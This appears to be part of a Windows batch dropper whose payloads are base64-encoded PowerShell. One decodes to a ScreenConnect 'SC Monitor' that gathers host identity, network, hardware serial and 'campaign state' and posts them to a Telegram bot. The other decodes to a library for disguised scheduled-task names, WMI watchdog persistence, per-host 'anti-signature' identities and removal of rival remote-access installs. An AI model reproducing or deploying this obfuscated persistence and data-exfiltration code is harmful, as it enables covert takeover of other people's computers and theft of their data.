amlNYXAuQ29udGFpbnNLZXkoJGtleSkpIHsgJGVtb2ppTWFwWyRrZXldIH0gZWxzZSB7IChbc3Ry
aW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEYxKSkgfQoKJHRpdGxlID0gc3dpdGNo
ICgka2V5KSB7CiAgICAnT0snIHsgJ1ByaW1hcnkgaGVhbHRoeScgfQogICAgJ0RPV04nIHsgJ1By
aW1hcnkgRE9XTiAtIGhlYWxpbmcnIH0KICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JF
RCcgfQogICAgJ0ZBSUwnIHsgJ0hlYWwgRkFJTEVEJyB9CiAgICAnRk9SQ0UnIHsgJ0ZvcmNlZCBy
ZWluc3RhbGwnIH0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1QgREVQTE9Z
IE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVEJyB9IH0KICAgICdIQicg
eyAnaG91cmx5IGRpZ2VzdCcgfQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRlIiB9Cn0KCiR0
cmFucyA9IGlmICgkT2xkU3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUiIH0gZWxzZSB7ICRT
dGF0ZSB9CiRzY0xpc3QgPSBHZXQtU2NJbnN0YWxscwokcm1tSGl0cyA9IEdldC1SbW1IaXRzCmlm
ICgkcm1tSGl0cy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5BZGQoJy0gKG5vbmUgZGV0
ZWN0ZWQpJykgfQoKJHB1YiA9IEdldC1QdWJsaWNJcAokbGFuID0gR2V0LUxvY2FsSXBzCiRub3cg
PSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzIHp6eicKJHVwdGltZSA9ICdu
L2EnCnRyeSB7CiAgICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lz
dGVtKS5MYXN0Qm9vdFVwVGltZQogICAgJHVwdGltZSA9ICd7MDpkZH1kIHswOmhofWggezA6bW19
bScgLWYgKChHZXQtRGF0ZSkgLSAkYm9vdCkKfSBjYXRjaCB7fQoKIyBjYW1wYWlnbiBzdGF0ZSBm
aWxlICh3cml0dGVuIGJ5IG93bl9saWIucHMxIHN0YXRlIGFjdGlvbikKJHN0YXRlTGluZSA9ICdu
L2EnCiRzdGF0ZU9iaiA9ICRudWxsCiRzdGF0ZVBhdGgyID0gSm9pbi1QYXRoICRXb3JrRGlyICdz
dGF0ZS5qc29uJwppZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgyKSB7CiAgICAkcmF3U3RhdGUgPSAo
R2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRyaW0oKQogICAgdHJ5
IHsKICAgICAgICAkc3RhdGVPYmogPSAkcmF3U3RhdGUgfCBDb252ZXJ0RnJvbS1Kc29uCiAgICAg
ICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3Jl
aWduIC1qb2luICcsJykgfSBlbHNlIHsgJy0nIH0KICAgICAgICAkc3RhdGVMaW5lID0gInByaW09
JCgkc3RhdGVPYmoucHJpbSkgYWx0PSQoJHN0YXRlT2JqLmFsdCkgZm9yZWlnbj1bJGZvcmVpZ25D
c3ZdIHRhc2tzPSQoJHN0YXRlT2JqLnRhc2tzT2spLyQoJHN0YXRlT2JqLnRhc2tzVG90YWwpIHdk
PSQoJHN0YXRlT2JqLndhdGNoZG9nKSBoZWFscz0kKCRzdGF0ZU9iai5pbnN0YWxsQ291bnQpIgog
ICAgfSBjYXRjaCB7ICRzdGF0ZUxpbmUgPSAkcmF3U3RhdGUgfQp9CgokZGVwbG95QmxvY2sgPSAn
JwppZiAoJGtleSAtZXEgJ0RFUExPWScpIHsKICAgICR2ZXJkaWN0ID0gaWYgKCRkZXBsb3lPaykg
eyAnREVQTE9ZRUQgLyBIRUFMVEhZJyB9IGVsc2UgeyAnREVQTE9ZRUQgQlVUIElOQ09NUExFVEUn
IH0KICAgICRmb3JlaWduID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRoICIke2VudjpQcm9ncmFtRmls
ZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTY3Jl
ZW5Db25uZWN0IENsaWVudCoiIC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfAogICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICc1ZjYwMTA1Nzk4
NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8OTkwODE5OGU2NjhlNDc1MCcgfSkKICAgICRkaWFnTGlu
ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQog
ICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0
LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAgJGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAg
J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2Zl
dGNoJywgJ21zaV9leGl0JywKICAgICAgICAgICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVf
JywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAnaWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0
ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29ycGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxs
JywgJ2FsdF8nCiAgICAgICAgKQogICAgICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9v
dFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1P
YmplY3QgewogICAgICAgICAgICAgICAgJGxpbmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFj
aCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJu
ICR0cnVlIH0gfQogICAgICAgICAgICAgICAgJGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAg
ICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3Qg
eyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0gPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8g
LXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGlu
ZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVr
ZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0KICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBs
b3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxiPiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5
IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0
b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9uLmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycg
fSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBtb24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQo
aWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6
ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFk
KQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6
ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTogTGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5
ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIgY3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJz
PC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBuIikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+
U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAk
KEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9uOiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgot
IFdoZW46ICQoRXNjICRub3cpCi0gU291cmNlIGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9j
b2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRl
bnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBVc2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4K
LSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6
ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNj
ICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5P
UyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVzYyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVz
YyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNjICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQot
IEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5M
YXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQot
IEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2Vy
aWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFsKTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFN
X0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlza0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNr
U2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5lY3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2
MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4
MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRhbHRMaW5lKQotIEdyeXhhIDxjb2RlPjk5MDgxOThl
NjY4ZTQ3NTA8L2NvZGU+OiAkKEVzYyAoR2V0LVN2Y0xpbmUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
ICg5OTA4MTk4ZTY2OGU0NzUwKScpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJN
TSAvIHJlbW90ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0
YXNrcyAoZXhwZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9i
PgotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdv
cmtEaXIpPC9jb2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
PC9iPgotIDxjb2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxp
YjwvY29kZT4KCjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUp
PC9jb2RlPgoKPGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAK
CiMgY29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5
IGhlYXJ0YmVhdCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAK
ICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBA
KCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRo
ICRtc2lDYWNoZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSku
TGVuZ3RoIC8gMUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9r
KSB7ICdPSycgfSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAt
bGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBH
ZXQtU3ZjTGluZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKDk5MDgxOThlNjY4ZTQ3NTApJwogICAg
JGdyeXhhU2hvcnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
bHNlIHsgJy0nIH0KICAgICR0ZXh0ID0gIiRlbW9qaSBTQ0R8JCgkZW52OkNPTVBVVEVSTkFNRSl8
c2V2PSRwcmltU2hvcnR8Z3J5PSRncnl4YVNob3J0fGFsdD0kYWx0U2hvcnR8Zj0kZm9yZWlnbk58
dD0kdGFza09rLzV8Yj0kQnVpbGQiCn0KCmlmICgkdGV4dC5MZW5ndGggLWd0IDM4MDApIHsKICAg
ICRybW1IaXRzID0gQCgoJHJtbUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxMikpICsgKCct
IC4uLiAoezB9IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpCiAgICAkc2NMaXN0ID0g
QCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0gLi4uICh7MH0gbW9y
ZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQogICAgJHRleHQgPSAkdGV4dC5TdWJzdHJpbmco
MCwgMzgwMCkgKyAiYG5gbjxpPlRSVU5DQVRFRCAoVGVsZWdyYW0gNDA5NiBsaW1pdCk8L2k+Igp9
CgokbG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicKZnVuY3Rpb24gU2VuZC1UZyhb
c3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsKICAgICRwYXlsb2FkID0gQHsKICAgICAgICBj
aGF0X2lkICAgICAgICAgICAgICAgICAgPSAkY2ZnLkNIQVRfSUQKICAgICAgICB0ZXh0ICAgICAg
ICAgICAgICAgICAgICAgPSAkbXNnCiAgICAgICAgZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0g
JHRydWUKICAgIH0KICAgIGlmICgkbW9kZSkgeyAkcGF5bG9hZC5wYXJzZV9tb2RlID0gJG1vZGUg
fQogICAgJGpzb24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
NQogICAgJGJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkanNv
bikKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgKCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcv
Ym90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3NhZ2UiKSBgCiAgICAgICAgLU1ldGhvZCBQb3N0
IC1Cb2R5ICRieXRlcyAtQ29udGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRm
LTgnIHwgT3V0LU51bGwKfQoKZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBbc3Ry
aW5nXSRtb2RlKSB7CiAgICAkdG9TZW5kID0gJG1zZwogICAgdHJ5IHsKICAgICAgICBTZW5kLVRn
IC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQogICAgICAgIHJldHVybiAkdHJ1ZQogICAgfSBjYXRj
aCB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgU2VuZC1UZyAtbXNnICgkdG9TZW5kLlN1YnN0
cmluZygwLCAzMDAwKSArICJgbjxpPlRSVU5DQVRFRDwvaT4iKSAtbW9kZSAkbW9kZQogICAgICAg
ICAgICByZXR1cm4gJHRydWUKICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgcmV0dXJuICRm
YWxzZQogICAgICAgIH0KICAgIH0KfQoKdHJ5IHsKICAgIGlmIChTZW5kLVRnU2FmZSAtbXNnICR0
ZXh0IC1tb2RlICdIVE1MJykgewogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9n
IC1WYWx1ZSAndGdfc2VudF9yaWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQogICAg
fSBlbHNlIHsKICAgICAgICB0aHJvdyAnaHRtbF9mYWlsZWQnCiAgICB9CiAgICBpZiAoJGtleSAt
ZXEgJ0RFUExPWScpIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFs
dWUgKCJ0Z19kZXBsb3lfb2s9IiArICRkZXBsb3lPaykgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUKICAgICAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0Rp
ciAnZGVwbG95X3RnLmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgfQp9IGNhdGNoIHsKICAgIHRyeSB7CiAgICAgICAg
JHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxbXj5dKz4nLCAnJykKICAgICAgICAk
cGxhaW4gPSBbU3lzdGVtLk5ldC5XZWJVdGlsaXR5XTo6SHRtbERlY29kZSgkcGxhaW4pCiAgICAg
ICAgaWYgKCRwbGFpbi5MZW5ndGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0cmlu
ZygwLCAzNTAwKSArICJgblRSVU5DQVRFRCIgfQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cgJHBs
YWluIC1tb2RlICcnIHwgT3V0LU51bGwKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGgg
JGxvZyAtVmFsdWUgJ3RnX3NlbnRfcGxhaW4nIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
CiAgICB9IGNhdGNoIHsKICAgICAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFs
dWUgKCJ0Z19mYWlsICIgKyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVu
dGx5Q29udGludWUKICAgIH0KfQo=
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAojIE9XTl9MSUIgIEJV
SUxEIDIwMjYwODAyTDE0CiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5IChhbnRp
LXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZwojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4pLCBj
YW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4KIyBMMTM6IHNjaHRhc2tzIENy
ZWF0ZSB2aWEgY21kIChsaWtlIFd1Y2FjaGVPd24pLCBUUiB1bmRlciBXaW5kb3dzXFRlbXBcLnd1
Y2FjaGUKIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwgL1NUIDAwOjAw
IG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLgojIEwxMjogSURFTlRWRVI9NyBST09ULWxldmVsIHRh
c2sgbmFtZXMgKG5lc3RlZCBNaWNyb3NvZnRcV2luZG93cyBBY2Nlc3MgRGVuaWVkKS4KIyBMMTE6
IE5FVkVSIHJldXNlIHJlYWwgV2luZG93cyBidWlsdC1pbiB0YXNrIG5hbWVzOyBUUiBvd25lcnNo
aXAgY2hlY2tzLgojIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRp
dGlvbiBzY29wZSBvbmx5LgojIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkApbQ21kbGV0QmluZGluZygpXQpw
YXJhbSgKICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgW1ZhbGlkYXRlU2V0
KCdpbml0JywgJ3dhdGNoZG9nJywgJ3dhdGNoZG9nLWVuc3VyZScsICd0YXNrcy1lbnN1cmUnLCAn
c3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywgJ3JlZ2lzdGVyZWQnLCAnZXh0ZXJtaW5hdGUn
KV0KICAgIFtzdHJpbmddJEFjdGlvbiwKICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3Jh
bURhdGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLAogICAgW3N0cmluZ10k
TW9uUGF0aCA9ICcnLAogICAgW3N0cmluZ10kQnVpbGQgID0gJ08xNScsCiAgICBbc3RyaW5nXSRF
eHRyYSAgPSAnJywKICAgIFtzdHJpbmddJEZwICAgICA9ICcnCikKCiRFcnJvckFjdGlvblByZWZl
cmVuY2UgPSAnU2lsZW50bHlDb250aW51ZScKJGNmZ1BhdGggPSBKb2luLVBhdGggJFdvcmtEaXIg
J2lkZW50aXR5LmNmZycKJElkZW50VmVyc2lvbiA9IDgKCiMgUm9vdC1sZXZlbCBuYW1lcyBXSVRI
T1VUIGxlYWRpbmcgYmFja3NsYXNoIChtYXRjaGVzIHdvcmtpbmcgV3VjYWNoZU93biBzdHlsZSku
CiRQb29scyA9IEB7CiAgICBBID0gQCgnV2VyUXVldWVTeW5jJywnRGlhZ0hvc3RDYWNoZScsJ05l
dFRyYWNlQ2FjaGUnLCdXZGlIb3N0UHJveHknLCdQbGFTZXJ2ZXJIZWFsdGgnLCdUY3BJcENvbmZs
aWN0UmVzJywnU3JDYWNoZVN5bmMnLCdSZXNvbHV0aW9uUXVldWUnKQogICAgQiA9IEAoJ1BsYVNl
cnZlckhlYWx0aCcsJ1dkaUhvc3RQcm94eScsJ1dlclF1ZXVlU3luYycsJ05ldFRyYWNlQ2FjaGUn
LCdEaWFnSG9zdENhY2hlJywnVGNwSXBDb25mbGljdFJlcycsJ1BsYVNlcnZlckRpYWcnLCdTckNh
Y2hlU3luYycpCiAgICBDID0gQCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1Rj
cElwQ29uZmxpY3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9z
dENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpCiAgICBEID0gQCgnVGNwSXBD
b25mbGljdFJlcycsJ1Jlc29sdXRpb25RdWV1ZScsJ05ldFRyYWNlQ2FjaGUnLCdEaWFnSG9zdENh
Y2hlJywnUGxhU2VydmVyRGlhZycsJ1dlclF1ZXVlU3luYycsJ1BsYVNlcnZlckhlYWx0aCcsJ1dk
aUhvc3RQcm94eScpCn0KJERlZmF1bHRzID0gW29yZGVyZWRdQHsKICAgIFRBU0tfQSA9ICdXZXJR
dWV1ZVN5bmMnCiAgICBUQVNLX0IgPSAnUGxhU2VydmVySGVhbHRoJwogICAgVEFTS19DID0gJ1dk
aUhvc3RQcm94eScKICAgIFRBU0tfRCA9ICdUY3BJcENvbmZsaWN0UmVzJwogICAgTU9fQSAgID0g
JzInCiAgICBNT19CICAgPSAnMycKfQoKZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsKICAgICRzID0g
MEwKICAgIGZvcmVhY2ggKCRjIGluICRlbnY6Q09NUFVURVJOQU1FLlRvVXBwZXIoKS5Ub0NoYXJB
cnJheSgpKSB7ICRzID0gKCRzICogMzEgKyBbaW50XSRjKSAlIDEwMDAwMDAwMDcgfQogICAgcmV0
dXJuICRzCn0KCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgewogICAgJGlkID0gJERlZmF1bHRzLkNs
b25lKCkKICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsKICAgICAgICBmb3JlYWNoICgkbGlu
ZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsKICAgICAg
ICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7
ICRpZFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAgICAgICAgfQogICAgfQogICAgcmV0
dXJuICRpZAp9CgpmdW5jdGlvbiBSZW1vdmUtVGFza1F1aWV0KFtzdHJpbmddJHRuKSB7CiAgICBp
ZiAoJHRuKSB7ICYgc2NodGFza3MuZXhlIC9EZWxldGUgL1ROICR0biAvRiAyPiYxIHwgT3V0LU51
bGwgfQp9CgpmdW5jdGlvbiBHZXQtVGFza1ZlcmJvc2VCbG9iKFtzdHJpbmddJHRuKSB7CiAgICBp
ZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVl
cnkgL1ROICR0biAvRk8gTElTVCAvViAyPiRudWxsCiAgICBpZiAoJExBU1RFWElUQ09ERSAtbmUg
MCAtb3IgLW5vdCAkb3V0KSB7IHJldHVybiAnJyB9CiAgICByZXR1cm4gKCgkb3V0IHwgRm9yRWFj
aC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIpCn0KCmZ1bmN0aW9uIFRlc3QtVGFza093bnNN
b24oW3N0cmluZ10kdG4sIFtzdHJpbmddJG1hcmtlcikgewogICAgIyBUcnVlIG9ubHkgaWYgdGhl
IHNjaGVkdWxlZCBhY3Rpb24gcG9pbnRzIGF0IE9VUiBtb24vZXRsIHBhdGgg4oCUIG5vdCBhIFdp
bmRvd3MgQ09NIGhhbmRsZXIuCiAgICAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgJHRuCiAg
ICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZhbHNlIH0KICAgIGlmICgkbWFya2VyIC1hbmQg
KCRibG9iIC1tYXRjaCBbcmVnZXhdOjpFc2NhcGUoJG1hcmtlcikpKSB7IHJldHVybiAkdHJ1ZSB9
CiAgICBpZiAoJGJsb2IgLW1hdGNoICcoP2kpXC53dWNhY2hlXFx8b3duX21vblwuY21kfGV0bF9t
b25cLmNtZHxcLmV0bGNhY2hlXFwnKSB7IHJldHVybiAkdHJ1ZSB9CiAgICByZXR1cm4gJGZhbHNl
Cn0KCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgewogICAgIyBJZGVtcG90ZW50IHdpdGhp
biBhbiBJREVOVFZFUiBnZW5lcmF0aW9uLiBQb29sIHVwZ3JhZGVzIGJ1bXAgSURFTlRWRVI6CiAg
